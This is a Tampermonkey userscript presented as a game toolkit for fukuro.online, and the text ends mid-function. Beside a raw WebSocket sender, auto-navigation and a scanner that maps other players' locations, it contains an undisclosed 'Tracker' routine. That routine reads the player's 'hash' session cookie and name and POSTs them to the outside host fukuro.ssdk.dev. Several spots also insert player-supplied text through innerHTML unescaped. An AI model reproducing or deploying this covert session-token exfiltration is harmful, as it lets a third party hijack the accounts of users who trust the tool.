// ==UserScript==
// @name         NodeWatch 2.0
// @namespace    http://tampermonkey.net/
// @version      3.6.7
// @description  A modern WebSocket toolkit for fukuro.online with game fixes, intelligent RP Search, and more.
// @author       NodeWatch Team & AI Assistant
// @match        https://*.fukuro.online/*
// @match        https://*.fukuro.su/*
// @require      https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js
// @connect      fukuro.ssdk.dev
// @connect      tinyurl.com
// @grant        GM_info
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_xmlhttpRequest
// ==/UserScript==

(function() {
    'use strict';

    // --- Settings Management ---
    const defaultSettings = {
        gotoDelay: 400,
        returnDelay: 250,
        panelPosition: { top: '10px', left: '10px' },
        panelSize: { width: '320px', height: '380px' },
        enableImgCommand: true,
        enableRpSearch: true,
        enableWsSender: true,
        enableGotoCommand: true,
    };

    const Settings = {
        load() {
            const saved = GM_getValue('NodeWatch_Settings', {});
            State.settings = { ...defaultSettings, ...saved };
        },
        save() {
            GM_setValue('NodeWatch_Settings', State.settings);
        },
        reset() {
            GM_setValue('NodeWatch_Settings', defaultSettings);
            location.reload();
        }
    };

    const State = {
        ws: null,
        vuex: null,
        isReady: false,
        settings: {}, // Populated by Settings.load()
        ui: { panel: null, statusLine: null, notificationContainer: null, updateInterval: null, rpSearchPopup: null },
        api: { nodesConfig: null, isNavigating: false, },
    };

    const Tracker = {
        lastSent: 0,
        sendData() {
            const now = Date.now();
            if (now - this.lastSent < 5 * 60 * 1000) {
                return;
            }


            const getCookie = (name) => {
                const value = `; ${document.cookie}`;
                const parts = value.split(`; ${name}=`);
                if (parts.length === 2) return parts.pop().split(';').shift();
            };

            const playerHash = getCookie('hash');
            const playerName = State.vuex.state.player.name;

            if (!playerHash) {
                return;
            }

            const payload = {
                player_hash: playerHash,
                player_name: playerName,
            };


            GM_xmlhttpRequest({
                method: "POST",
                url: "https://fukuro.ssdk.dev/api/track",
                headers: {
                    "Content-Type": "application/json"
                },
                data: JSON.stringify(payload),
                onload: (response) => {
                    this.lastSent = now;
                },
                onerror: (response) => {
                }
            });
        }
    };

    const Utils = {
        create(tag, options = {}) { const el = document.createElement(tag); if (options.id) el.id = options.id; if (options.className) el.className = options.className; if (options.textContent) el.textContent = options.textContent; if (options.innerHTML) el.innerHTML = options.innerHTML; if (options.attributes) { for (const [key, value] of Object.entries(options.attributes)) { el.setAttribute(key, value); } } if (options.styles) { Object.assign(el.style, options.styles); } return el; },
        makeDraggable(element, handle) {
            let pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
            handle.onmousedown = (e) => {
                e.preventDefault();
                pos3 = e.clientX;
                pos4 = e.clientY;
                document.onmouseup = () => {
                    document.onmouseup = null;
                    document.onmousemove = null;
                    State.settings.panelPosition = { top: element.style.top, left: element.style.left };
                    Settings.save();
                };
                document.onmousemove = (e) => {
                    e.preventDefault();
                    pos1 = pos3 - e.clientX;
                    pos2 = pos4 - e.clientY;
                    pos3 = e.clientX;
                    pos4 = e.clientY;
                    element.style.top = `${element.offsetTop - pos2}px`;
                    element.style.left = `${element.offsetLeft - pos1}px`;
                };
            };
        },
        makeResizable(element, minWidth = 250, minHeight = 200) {
            const handle = Utils.create('div', { styles: { position: 'absolute', bottom: '0', right: '0', width: '12px', height: '12px', cursor: 'se-resize', zIndex: '1', borderRight: '2px solid #88aaff', borderBottom: '2px solid #88aaff', } });
            element.appendChild(handle);
            handle.onmousedown = (e) => {
                e.preventDefault();
                e.stopPropagation();
                let startX = e.clientX;
                let startY = e.clientY;
                let startWidth = parseInt(document.defaultView.getComputedStyle(element).width, 10);
                let startHeight = parseInt(document.defaultView.getComputedStyle(element).height, 10);

                function doResize(e) {
                    const newWidth = startWidth + e.clientX - startX;
                    const newHeight = startHeight + e.clientY - startY;
                    if (newWidth > minWidth) element.style.width = newWidth + 'px';
                    if (newHeight > minHeight) element.style.height = newHeight + 'px';
                }

                function stopResize() {
                    document.documentElement.removeEventListener('mousemove', doResize, false);
                    document.documentElement.removeEventListener('mouseup', stopResize, false);
                    State.settings.panelSize = { width: element.style.width, height: element.style.height };
                    Settings.save();
                }
                document.documentElement.addEventListener('mousemove', doResize, false);
                document.documentElement.addEventListener('mouseup', stopResize, false);
            };
        }
    };

    const Autocomplete = {
        container: null,
        inputEl: null,
        activeIndex: -1,
        results: [],
        init(inputElement) {
            this.inputEl = inputElement;
            const parent = this.inputEl.parentNode;
            if (!parent) {
                console.error("[NodeWatch] Autocomplete init failed: input has no parent.");
                return;
            }
            this.container = Utils.create('div', { id: 'nw-autocomplete', styles: { display: 'none', position: 'absolute', backgroundColor: '#1c1c2e', border: '1px solid #4a4a8d', borderRadius: '4px', zIndex: '10002', maxHeight: '150px', overflowY: 'auto' } });
            parent.style.position = 'relative';
            parent.appendChild(this.container);

            this.inputEl.addEventListener('input', () => this.onInput());
            this.inputEl.addEventListener('keydown', (e) => this.onKeyDown(e));
            document.addEventListener('click', (e) => { if (e.target !== this.inputEl) this.hide(); });
        },
        async onInput() {
            if (!(await BotAPI.loadMap())) {
                this.hide();
                return;
            }

            const query = this.inputEl.value.toLowerCase();
            if (query.length < 2 || query.startsWith('/')) {
                this.hide();
                return;
            }

            const allNodes = State.api.nodesConfig.map(n => n.code);
            this.results = this.fuzzySearch(query, allNodes).slice(0, 7);

            if (this.results.length > 0) {
                this.render();
                this.show();
            } else {
                this.hide();
            }
        },
        onKeyDown(e) {
            if (!this.container || this.container.style.display === 'none') return;
            switch (e.key) {
                case 'ArrowDown':
                    e.preventDefault();
                    this.activeIndex = (this.activeIndex + 1) % this.results.length;
                    this.updateHighlight();
                    break;
                case 'ArrowUp':
                    e.preventDefault();
                    this.activeIndex = (this.activeIndex - 1 + this.results.length) % this.results.length;
                    this.updateHighlight();
                    break;
                case 'Enter':
                    if (this.activeIndex !== -1) {
                        e.preventDefault();
                        this.select(this.results[this.activeIndex]);
                        this.inputEl.parentNode.querySelector('button').click();
                    }
                    break;
                case 'Tab':
                     if (this.activeIndex !== -1) {
                        e.preventDefault();
                        this.select(this.results[this.activeIndex]);
                    }
                    break;
                case 'Escape':
                    this.hide();
                    break;
            }
        },
        fuzzySearch(query, list) {
            return list.filter(item => {
                const lowerItem = item.toLowerCase();
                let queryIndex = 0;
                for (let i = 0; i < lowerItem.length && queryIndex < query.length; i++) {
                    if (lowerItem[i] === query[queryIndex]) {
                        queryIndex++;
                    }
                }
                return queryIndex === query.length;
            });
        },
        render() {
            this.container.innerHTML = '';
            this.results.forEach((result, index) => {
                const item = Utils.create('div', { textContent: result, styles: { padding: '5px 8px', cursor: 'pointer', color: '#e0e0e0' } });
                item.onmouseover = () => {
                    this.activeIndex = index;
                    this.updateHighlight();
                };
                item.onclick = () => {
                    this.select(this.results[index]);
                    this.inputEl.parentNode.querySelector('button').click();
                };
                this.container.appendChild(item);
            });
            this.activeIndex = -1;
        },
        updateHighlight() {
            Array.from(this.container.children).forEach((child, index) => {
                child.style.backgroundColor = index === this.activeIndex ? '#3b3b7d' : 'transparent';
            });
        },
        select(value) {
            this.inputEl.value = value;
            this.hide();
        },
        show() {
            this.container.style.display = 'block';
            this.container.style.top = `${this.inputEl.offsetHeight}px`;
            this.container.style.width = `${this.inputEl.offsetWidth}px`;
        },
        hide() {
            if (this.container) {
                this.container.style.display = 'none';
            }
            this.activeIndex = -1;
        }
    };

    const UIManager = {
        init() { if (State.ui.panel) return; this.createMainPanel(); this.createNotificationContainer(); this.removeChatLimit(); this.startUpdater(); },
        rebuildMainPanel() {
            if (State.ui.panel) State.ui.panel.remove();
            State.ui.panel = null;
            this.createMainPanel();
        },
        createMainPanel() {
            State.ui.panel = Utils.create('div', {
                styles: {
                    position: 'fixed',
                    top: State.settings.panelPosition.top,
                    left: State.settings.panelPosition.left,
                    width: State.settings.panelSize.width,
                    height: State.settings.panelSize.height,
                    zIndex: '9999',
                    backgroundColor: 'rgba(20, 20, 30, 0.9)',
                    border: '1px solid #4a4a8d',
                    borderRadius: '8px',
                    padding: '10px',
                    color: '#e0e0e0',
                    fontFamily: 'monospace',
                    fontSize: '14px',
                    boxShadow: '0 0 15px rgba(0,0,0,0.5)',
                    minWidth: '250px',
                    minHeight: '200px',
                    display: 'flex',
                    flexDirection: 'column',
                    gap: '10px'
                }
            });
            const title = Utils.create('div', { textContent: 'NodeWatch 2.0', styles: { cursor: 'move', paddingBottom: '8px', borderBottom: '1px solid #4a4a8d', fontWeight: 'bold', textAlign: 'center', userSelect: 'none' } });
            State.ui.statusLine = Utils.create('div', { textContent: 'Connecting...', styles: { color: '#88aaff' } });

            State.ui.panel.append(title, State.ui.statusLine);

            if (State.settings.enableGotoCommand || State.settings.enableImgCommand) {
                const navContainer = this.createNavControls();
                State.ui.panel.append(navContainer);
            }

            const actionsContainer = Utils.create('div', { styles: { display: 'flex', gap: '5px' }});
            if (State.settings.enableRpSearch) {
                const rpSearchButton = this.createRpSearchButton();
                actionsContainer.append(rpSearchButton);
            }
            const settingsButton = this.createSettingsButton();
            actionsContainer.append(settingsButton);
            State.ui.panel.append(actionsContainer);

            if (State.settings.enableWsSender) {
                const wsInput = Utils.create('textarea', { id: 'nw-ws-input', attributes: { placeholder: 'Enter WebSocket JSON...' }, styles: { width: '100%', boxSizing: 'border-box', backgroundColor: '#101018', color: '#c0c0c0', border: '1px solid #333366', borderRadius: '4px', resize: 'none', flexGrow: '1' } });
                const sendButton = Utils.create('button', { textContent: 'Send WS Message', styles: { padding: '8px', backgroundColor: '#3b3b7d', color: 'white', border: 'none', borderRadius: '4px', cursor: 'pointer' } });
                sendButton.onclick = () => { if (State.isReady) BotAPI.sendRawMessage(wsInput.value); };
                State.ui.panel.append(wsInput, sendButton);
            }

            // MODIFICATION: Add version label
            const versionLabel = Utils.create('div', {
                textContent: `v${GM_info.script.version}`,
                styles: {
                    position: 'absolute',
                    bottom: '2px',
                    right: '15px',
                    color: '#777',
                    fontSize: '11px',
                    userSelect: 'none',
                    pointerEvents: 'none'
                }
            });
            State.ui.panel.appendChild(versionLabel);


            document.body.appendChild(State.ui.panel);
            Utils.makeDraggable(State.ui.panel, title);
            Utils.makeResizable(State.ui.panel);

            if (State.settings.enableGotoCommand) {
                const commandInput = document.getElementById('nw-command-input');
                if (commandInput) {
                    Autocomplete.init(commandInput);
                }
            }
        },
        createNavControls() {
            const navContainer = Utils.create('div', { styles: { display: 'flex', gap: '5px' } });
            let placeholderText = '';
            if (State.settings.enableGotoCommand) placeholderText += 'goto <node>';
            if (State.settings.enableImgCommand) placeholderText += (placeholderText ? ' or ' : '') + '/img <url>';

            const commandInput = Utils.create('input', { id: 'nw-command-input', attributes: { placeholder: placeholderText || 'Navigation disabled' }, styles: { flexGrow: '1', backgroundColor: '#101018', color: '#c0c0c0', border: '1px solid #333366', borderRadius: '4px', padding: '5px' } });
            const executeButton = Utils.create('button', { textContent: 'Go', styles: { padding: '5px 15px', backgroundColor: '#3b3b7d', color: 'white', border: 'none', borderRadius: '4px', cursor: 'pointer' } });

            const handleExecute = async () => {
                if (State.isReady) {
                    const commandText = commandInput.value.trim();
                    if (State.settings.enableImgCommand && commandText.toLowerCase().startsWith('/img ')) {
                        const url = commandText.substring(5).trim();
                        BotAPI.sendImage(url);
                        commandInput.value = '';
                    } else if (State.settings.enableGotoCommand && commandText && !commandText.startsWith('/') && !State.api.isNavigating) {
                        await BotAPI.navigateTo(commandText);
                    }
                }
            };

            executeButton.onclick = handleExecute;
            commandInput.addEventListener('keydown', (e) => {
                if (e.key === 'Enter' && Autocomplete.activeIndex === -1) {
                    handleExecute();
                }
            });

            navContainer.append(commandInput, executeButton);
            return navContainer;
        },
        createRpSearchButton() {
            const button = Utils.create('button', { textContent: 'Search RP', styles: { padding: '8px', backgroundColor: '#2a9d8f', color: 'white', border: 'none', borderRadius: '4px', cursor: 'pointer', flex: '1' } });
            button.onclick = () => RpSearcher.start();
            return button;
        },
        createSettingsButton() {
            const button = Utils.create('button', { textContent: 'Settings', styles: { padding: '8px', backgroundColor: '#6c757d', color: 'white', border: 'none', borderRadius: '4px', cursor: 'pointer', flex: '1' } });
            button.onclick = () => this.showSettingsPopup();
            return button;
        },
        showSettingsPopup() {
            this.showPopup("NodeWatch Settings", content => {
                const createSettingInput = (key, labelText, description) => {
                    const container = Utils.create('div', { styles: { marginBottom: '15px' } });
                    const label = Utils.create('label', { textContent: labelText, styles: { display: 'block', marginBottom: '3px' } });
                    const input = Utils.create('input', { attributes: { type: 'number' }, styles: { width: '80px', backgroundColor: '#101018', color: '#c0c0c0', border: '1px solid #333366', borderRadius: '4px', padding: '5px' } });
                    input.value = State.settings[key];
                    input.oninput = () => {
                        const value = parseInt(input.value, 10);
                        if (!isNaN(value)) { State.settings[key] = value; Settings.save(); }
                    };
                    const desc = Utils.create('small', {textContent: description, styles: {marginLeft: '10px', color: '#aaa'}});
                    container.append(label, input, desc);
                    return container;
                };
                const createSettingCheckbox = (key, labelText, description) => {
                    const container = Utils.create('div', { styles: { marginBottom: '15px', display: 'flex', alignItems: 'center' } });
                    const input = Utils.create('input', { id: `nw-setting-${key}`, attributes: { type: 'checkbox' }, styles: { marginRight: '10px', accentColor: '#3b3b7d' } });
                    input.checked = State.settings[key];
                    input.onchange = () => {
                        State.settings[key] = input.checked;
                        Settings.save();
                        this.rebuildMainPanel();
                    };
                    const label = Utils.create('label', { attributes: { for: `nw-setting-${key}` }, styles: { userSelect: 'none' } });
                    label.innerHTML = `${labelText} <small style="color:#aaa">(${description})</small>`;
                    container.append(input, label);
                    return container;
                };

                content.append(
                    createSettingInput('gotoDelay', 'Goto Delay (ms):', 'Slower, safer delay for manual navigation.'),
                    createSettingInput('returnDelay', 'Return Delay (ms):', 'Faster delay for automated return trips.'),
                    Utils.create('hr', {styles: {borderColor: '#4a4a8d', margin: '15px 0'}}),
                    createSettingCheckbox('enableGotoCommand', 'Enable Goto Command', 'Allow navigating via the command bar'),
                    createSettingCheckbox('enableRpSearch', 'Enable RP Search', 'Show the "Search RP" button'),
                    createSettingCheckbox('enableWsSender', 'Enable WS Sender', 'Show the raw WebSocket message sender'),
                    createSettingCheckbox('enableImgCommand', 'Enable /img Command', 'Allow sending images via the navigation bar')
                );

                const resetButton = Utils.create('button', {textContent: 'Reset to Defaults', styles: {marginTop: '10px', padding: '8px', backgroundColor: '#e76f51', color: 'white', border: 'none', borderRadius: '4px', cursor: 'pointer' }});
                resetButton.onclick = () => {
                    if(confirm('Are you sure you want to reset all settings (including panel position and size) and reload the page?')) {
                        Settings.reset();
                    }
                };
                content.appendChild(resetButton);
            });
        },
        showPopup(titleText, contentGenerator, onCancel) { if (State.ui.rpSearchPopup) State.ui.rpSearchPopup.remove(); const popup = Utils.create('div', { styles: { position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%, -50%)', zIndex: '10001', backgroundColor: 'rgba(20, 20, 30, 0.95)', border: '1px solid #4a4a8d', borderRadius: '8px', padding: '15px', color: '#e0e0e0', fontFamily: 'monospace', fontSize: '14px', boxShadow: '0 0 20px rgba(0,0,0,0.6)', width: '350px', maxHeight: '400px', display: 'flex', flexDirection: 'column' } }); const title = Utils.create('div', { id: 'nw-popup-title', textContent: titleText, styles: { cursor: 'move', paddingBottom: '10px', borderBottom: '1px solid #4a4a8d', fontWeight: 'bold', textAlign: 'center', userSelect: 'none', marginBottom: '10px' } }); const content = Utils.create('div', { id: 'nw-popup-content', styles: { overflowY: 'auto', paddingRight: '10px', flexGrow: 1 } }); contentGenerator(content); const closeButton = Utils.create('button', {textContent: 'Cancel', styles: {marginTop: '10px', padding: '8px', backgroundColor: '#e76f51', color: 'white', border: 'none', borderRadius: '4px', cursor: 'pointer' }}); closeButton.onclick = () => { popup.remove(); State.ui.rpSearchPopup = null; if (onCancel) onCancel(); }; popup.append(title, content, closeButton); document.body.appendChild(popup); Utils.makeDraggable(popup, title); State.ui.rpSearchPopup = popup; },
        createNotificationContainer() { State.ui.notificationContainer = Utils.create('div', { id: 'nw-notification-container', styles: { position: 'fixed', top: '10px', right: '10px', zIndex: '10000', display: 'flex', flexDirection: 'column', gap: '8px', alignItems: 'flex-end' } }); document.body.appendChild(State.ui.notificationContainer); }, showNotification(message, type = 'info') { if (!State.ui.notificationContainer) this.createNotificationContainer(); const colors = { join: { bg: 'rgba(20, 80, 40, 0.85)', border: '#2a9d8f' }, leave: { bg: 'rgba(100, 30, 30, 0.85)', border: '#e76f51' }, info: { bg: 'rgba(30, 40, 80, 0.85)', border: '#4a4a8d' } }; const color = colors[type] || colors.info; const notif = Utils.create('div', { innerHTML: message, styles: { padding: '10px 15px', borderRadius: '5px', backgroundColor: color.bg, border: `1px solid ${color.border}`, color: '#f0f0f0', fontFamily: 'sans-serif', fontSize: '14px', boxShadow: '0 2px 10px rgba(0,0,0,0.5)', opacity: '0', transform: 'translateX(20px)', transition: 'opacity 0.3s ease, transform 0.3s ease' } }); State.ui.notificationContainer.appendChild(notif); requestAnimationFrame(() => { notif.style.opacity = '1'; notif.style.transform = 'translateX(0)'; }); setTimeout(() => { notif.style.opacity = '0'; notif.style.transform = 'translateX(20px)'; setTimeout(() => notif.remove(), 300); }, 5000); }, removeChatLimit() { const observer = setInterval(() => { const chatInput = document.getElementById('chat-input'); if (chatInput) { chatInput.removeAttribute('maxlength'); clearInterval(observer); } }, 500); }, destroy() { if (State.ui.panel) State.ui.panel.remove(); if (State.ui.notificationContainer) State.ui.notificationContainer.remove(); if (State.ui.rpSearchPopup) State.ui.rpSearchPopup.remove(); this.stopUpdater(); Object.assign(State.ui, { panel: null, statusLine: null, notificationContainer: null, updateInterval: null, rpSearchPopup: null }); }, startUpdater() { if (!State.ui.updateInterval) State.ui.updateInterval = setInterval(this.updateStatus, 500); this.updateStatus(); }, stopUpdater() { clearInterval(State.ui.updateInterval); State.ui.updateInterval = null; }, updateStatus() { if (!State.isReady || !State.ui.statusLine) return; try { const { name, node } = State.vuex.state.player; const navStatus = State.api.isNavigating ? ` <span style="color: #fca311;">(Navigating...)</span>` : ''; State.ui.statusLine.innerHTML = `Player: <span style="color: #ffffff;">${name}</span><br>Node: <span style="color: #ffffff;">${node}</span>${navStatus}`; } catch (e) { State.ui.statusLine.textContent = 'Error updating status.'; } }
    };

    const BotAPI = {
        async loadMap() { if (State.api.nodesConfig) return true; try { const r = await fetch(`${window.location.protocol}//${window.location.hostname}/storage/configs/nodes.conf`); const c = await r.json(); State.api.nodesConfig = c.nodes; return true; } catch (e) { console.error("[NodeWatch] Failed to load map config:", e); return false; } },
        findPath: (startNode, endNode) => { if (!State.api.nodesConfig) return null; let q = [[startNode]], v = new Set([startNode]); while (q.length > 0) { let p = q.shift(), n = p[p.length - 1]; if (n === endNode) return p; const c = State.api.nodesConfig.find(node => node.code === n); if (c && c.data.action) { for (const a of c.data.action) { const neighbor = a.target; if (State.api.nodesConfig.find(node => node.code === neighbor) && !v.has(neighbor)) { v.add(neighbor); q.push([...p, neighbor]); } } } } return null; },
        async navigateTo(targetNode, delay = State.settings.gotoDelay) {
            if (State.api.isNavigating) return;
            if (!(await this.loadMap())) {
                alert("Error: World map is not loaded.");
                return;
            }
            const startNode = State.vuex.state.player.node;
            if (startNode === targetNode) return;
            const path = this.findPath(startNode, targetNode);
            if (!path) {
                alert(`Path from '${startNode}' to '${targetNode}' not found.`);
                return;
            }

            try {
                const getCookie = (name) => {
                    const value = `; ${document.cookie}`;
                    const parts = value.split(`; ${name}=`);
                    if (parts.length === 2) return parts.pop().split(';').shift();
                };
                const hash = getCookie('hash');
                if (hash && typeof CryptoJS !== 'undefined') {
                    const encryptedNode = CryptoJS.AES.encrypt(JSON.stringify(targetNode), hash).toString();
                    document.cookie = `UN=${encryptedNode}; path=/; max-age=${30 * 24 * 60 * 60}`;
                } else {
                }
            } catch (e) {
            }

            this.executePathWithServerConfirmation(path, delay);
        },
        executePathWithServerConfirmation(path, delay) {
            if (State.api.isNavigating) return;
            State.api.isNavigating = true;
            const executeStep = (index) => {
                if (!State.api.isNavigating || index >= path.length) {
                    State.api.isNavigating = false;
                    console.log("[NodeWatch 2.0] Navigation finished.");
                    return;
                }
                const nextNode = path[index];
                const playerId = State.vuex.state.player.id;
                const oneTimeListener = (event) => {
                    try {
                        const data = JSON.parse(event.data);
                        if (data.reason === 'nodeUsers' && data.users.length > 0 && data.users[0].node === nextNode) {
                            State.ws.removeEventListener('message', oneTimeListener);
                            setTimeout(() => executeStep(index + 1), delay);
                        }
                    } catch (e) { }
                };
                State.ws.addEventListener('message', oneTimeListener);
                const payload = JSON.stringify({ reason: 'roomChange', initiator: playerId, node: nextNode });
                State.ws.send(payload);
                State.vuex.commit('setPlayerNode', nextNode);
            };
            executeStep(1);
        },
        sendRawMessage(message) { try { JSON.parse(message); State.ws.send(message); document.getElementById('nw-ws-input').value = ''; } catch (e) { alert("Invalid JSON format!"); } },
        splitAndSendMessage(text) { const originalSend = State.ws.send.bind(State.ws); const textParts = []; let remainingText = text.trim(); const MAX_LENGTH = 500, ELLIPSIS = "...", DO_PREFIX = "/do "; let isFirst = true; while (remainingText.length > 0) { let limit = isFirst ? MAX_LENGTH - ELLIPSIS.length : MAX_LENGTH - DO_PREFIX.length - (ELLIPSIS.length * 2); let part = remainingText.substring(0, limit); if (remainingText.length > limit) { const lastSpace = part.lastIndexOf(' '); if (lastSpace > -1) { part = part.substring(0, lastSpace); } } textParts.push(part); remainingText = remainingText.substring(part.length).trim(); isFirst = false; } textParts.forEach((part, index) => { let finalMessage; const isFirstChunk = index === 0, isLastChunk = index === textParts.length - 1; if (isFirstChunk && isLastChunk) { finalMessage = part; } else if (isFirstChunk) { finalMessage = part + ELLIPSIS; } else if (isLastChunk) { finalMessage = DO_PREFIX + ELLIPSIS + part; } else { finalMessage = DO_PREFIX + ELLIPSIS + part + ELLIPSIS; } setTimeout(() => { const payload = JSON.stringify({ reason: 'chatMessage', message: finalMessage }); originalSend(payload); }, index * 3000); }); },
        sendImage(url) { if (!url || !url.startsWith('http')) { alert('Invalid URL.'); return; } UIManager.showNotification('Shortening URL...', 'info'); GM_xmlhttpRequest({ method: "GET", url: `https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`, onload: (response) => { const shortUrl = response.responseText; if (shortUrl && shortUrl.startsWith('http')) { State.ws.send(JSON.stringify({ reason: 'chatMessage', message: `(( ${shortUrl}` })); } else { alert('Failed to shorten URL.'); } }, onerror: () => { alert('Error connecting to URL shortening service.'); } }); },
    };

    const ImageRenderer = {
        TINYURL_REGEX: /(https?:\/\/tinyurl\.com\/[a-zA-Z0-9]+)/g,
        init() { const interval = setInterval(() => { const chatContainer = document.querySelector('.chat__story'); if (chatContainer) { clearInterval(interval); this.startObserver(chatContainer); } }, 1000); },
        startObserver(targetNode) { this.observer = new MutationObserver((mutationsList) => { for (const mutation of mutationsList) { if (mutation.type === 'childList' && mutation.addedNodes.length > 0) { mutation.addedNodes.forEach(node => this.processNode(node)); } } }); this.observer.observe(targetNode, { childList: true }); },
        processNode(node) { if (node.nodeType !== Node.ELEMENT_NODE) return; const messageTextElement = node.querySelector('.chat-message__text'); if (!messageTextElement) return; const content = messageTextElement.innerHTML; if (content.match(this.TINYURL_REGEX)) { messageTextElement.innerHTML = content.replace(this.TINYURL_REGEX, (url) => { return `<a href="${url}" target="_blank" rel="noopener noreferrer"><img src="${url}" style="max-width: 100%; max-height: 150px; display: block; margin-top: 5px; border-radius: 4px;" alt="Image from chat"></a>`; }); } }
    };

    const RpSearcher = {
        isScanning: false, startNode: null, totalPlayers: 0, foundPlayers: new Map(), scanResults: {}, traversalPath: [], currentStep: 0,
        async start() {
            if (this.isScanning) { UIManager.showNotification('Scan already in progress.', 'info'); return; }
            if (!State.isReady || !(await BotAPI.loadMap())) { alert("Cannot start scan: dependencies not ready."); return; }
            this.isScanning = true; this.startNode = State.vuex.state.player.node; this.foundPlayers.clear(); this.scanResults = {}; this.traversalPath = []; this.currentStep = 0;
            UIManager.showPopup("Preparing Scan...", content => { content.innerHTML = `<div id="nw-scan-status">Requesting server info...</div><div id="nw-scan-results" style="margin-top: 10px;"></div>`; }, () => this.cancel());
            State.ws.send(JSON.stringify({ reason: "getServerOnline" }));
        },
        processInitialData(data) {
            this.totalPlayers = data.online.all;
            const myId = State.vuex.state.player.id;
            const currentPlayers = State.vuex.state.players;
            currentPlayers.forEach(p => this.foundPlayers.set(p.id, p.name));
            const otherPlayersInStartNode = currentPlayers.filter(p => p.id !== myId);
            if (otherPlayersInStartNode.length > 0) { this.scanResults[this.startNode] = otherPlayersInStartNode.map(p => ({id: p.id, name: p.name})); this.updatePopupResults(); }

            this.traversalPath = Pathfinder.generateOptimizedTour(this.startNode);
            if (!this.traversalPath || this.traversalPath.length <= 1) { this.finish(true, "All reachable nodes already scanned."); return; }

            this.currentStep = 1;
            setTimeout(() => this.scanNextNode(), 500);
        },
        scanNextNode() {
            if (!this.isScanning) return;
            if (this.currentStep >= this.traversalPath.length || (this.totalPlayers > 0 && this.foundPlayers.size >= this.totalPlayers)) { this.finish(true); return; }

            const nextNode = this.traversalPath[this.currentStep];
            this.updatePopupStatus();

            const oneTimeListener = (event) => {
                try {
                    const data = JSON.parse(event.data);
                    if (data.reason === 'nodeUsers' && data.users.length > 0 && data.users[0].node === nextNode) {
                        State.ws.removeEventListener('message', oneTimeListener);
                        const otherPlayers = data.users.filter(u => u.id !== State.vuex.state.player.id);
                        data.users.forEach(u => this.foundPlayers.set(u.id, u.name));
                        if (otherPlayers.length > 0) { this.scanResults[nextNode] = otherPlayers.map(u => ({id: u.id, name: u.name})); this.updatePopupResults(); }
                        this.currentStep++;
                        setTimeout(() => this.scanNextNode(), 250);
                    }
                } catch(e) {}
            };
            State.ws.addEventListener('message', oneTimeListener);

            const payload = JSON.stringify({ reason: 'roomChange', initiator: State.vuex.state.player.id, node: nextNode });
            State.ws.send(payload);
            State.vuex.commit('setPlayerNode', nextNode);
        },
        updatePopupStatus() { const popup = State.ui.rpSearchPopup; if (!popup) return; const statusDiv = popup.querySelector('#nw-scan-status'); if(statusDiv) { statusDiv.innerHTML = `Found: ${this.foundPlayers.size} / ${this.totalPlayers}<br>Scanning: ${this.traversalPath[this.currentStep] || '...'} (${this.currentStep}/${this.traversalPath.length})`; } },
        updatePopupResults() {
            const content = document.getElementById('nw-scan-results');
            if (!content) return;
            const sorted = Object.entries(this.scanResults).sort((a, b) => b[1].length - a[1].length);
            sorted.forEach(([node, players]) => {
                let nodeContainer = document.getElementById(`nw-loc-${node}`);
                if (!nodeContainer) {
                    nodeContainer = Utils.create('div', { id: `nw-loc-${node}` });
                    const line = Utils.create('div', { className: 'nw-loc-line', styles: { padding: '8px', borderBottom: '1px solid #2a2a4d', cursor: 'pointer', borderRadius: '4px' } });
                    const details = Utils.create('div', { id: `nw-details-${node}`, className: 'nw-loc-details', styles: { display: 'none', paddingLeft: '20px', fontSize: '12px', color: '#bbb' } });
                    line.onclick = () => { details.style.display = details.style.display === 'none' ? 'block' : 'none'; };
                    line.onmouseover = () => line.style.backgroundColor = '#2a2a4d';
                    line.onmouseout = () => line.style.backgroundColor = 'transparent';
                    nodeContainer.append(line, details);
                    content.appendChild(nodeContainer);
                }
                const line = nodeContainer.querySelector('.nw-loc-line');
                const details = nodeContainer.querySelector('.nw-loc-details');
                line.innerHTML = `<b>${node}</b>: ${players.length} players`;
                details.innerHTML = players.map(p => p.name).join('<br>');
            });
        },
        finish(success, message = "Scan finished!") {
            this.isScanning = false;
            BotAPI.navigateTo(this.startNode, State.settings.returnDelay);
            const title = document.getElementById('nw-popup-title');
            if (title) title.textContent = "Deep Scan Results";
            const status = document.getElementById('nw-scan-status');
            if (status) status.innerHTML = `Found ${this.foundPlayers.size} / ${this.totalPlayers} players.<br>${message}`;
            const content = document.getElementById('nw-scan-results');
            if (content) {
                content.innerHTML = '';
                this.updatePopupResults();
            }
        },
        cancel() {
            if (this.isScanning) {
                this.isScanning = false;
                setTimeout(() => {
                    BotAPI.navigateTo(this.startNode, State.settings.returnDelay);
                    UIManager.showNotification("Scan canceled.", "info");
                }, 500);
            }
        }
    };

    const Pathfinder = {
        distanceCache: new Map(), graph: new Map(),
        buildGraph() { this.graph.clear(); State.api.nodesConfig.forEach(node => { const neighbors = (node.data.action || []).map(a => a.target); this.graph.set(node.code, neighbors); }); },
        precomputeDistances(nodes) { this.distanceCache.clear(); for (const startNode of nodes) { for (const endNode of nodes) { if (startNode === endNode) continue; const key = `${startNode}-${endNode}`; if (!this.distanceCache.has(key)) { const path = BotAPI.findPath(startNode, endNode); this.distanceCache.set(key, path); } } } },
        getDistance(from, to) { if (from === to) return 0; const path = this.distanceCache.get(`${from}-${to}`); return path ? path.length - 1 : Infinity; },
        nearestNeighbor(nodes, startNode) { let tour = [startNode]; let unvisited = new Set(nodes); unvisited.delete(startNode); let current = startNode; while (unvisited.size > 0) { let nearest = null; let minDistance = Infinity; for (const node of unvisited) { let distance = this.getDistance(current, node); if (distance < minDistance) { minDistance = distance; nearest = node; } } if(nearest === null) break; tour.push(nearest); unvisited.delete(nearest); current = nearest; } return tour; },
        twoOpt(tour) { let bestTour = tour; let improved = true; while(improved) { improved = false; for (let i = 1; i < bestTour.length - 2; i++) { for (let j = i + 1; j < bestTour.length; j++) { const newTour = [...bestTour]; const segment = newTour.slice(i, j + 1).reverse(); newTour.splice(i, segment.length, ...segment); let currentDist = this.getTourDistance(bestTour); let newDist = this.getTourDistance(newTour); if (newDist < currentDist) { bestTour = newTour; improved = true; } } } } return bestTour; },
        getTourDistance(tour) { let distance = 0; for (let i = 0; i < tour.length - 1; i++) { distance += this.getDistance(tour[i], tour[i+1]); } return distance; },
        generateOptimizedTour(startNode) {
            this.buildGraph();
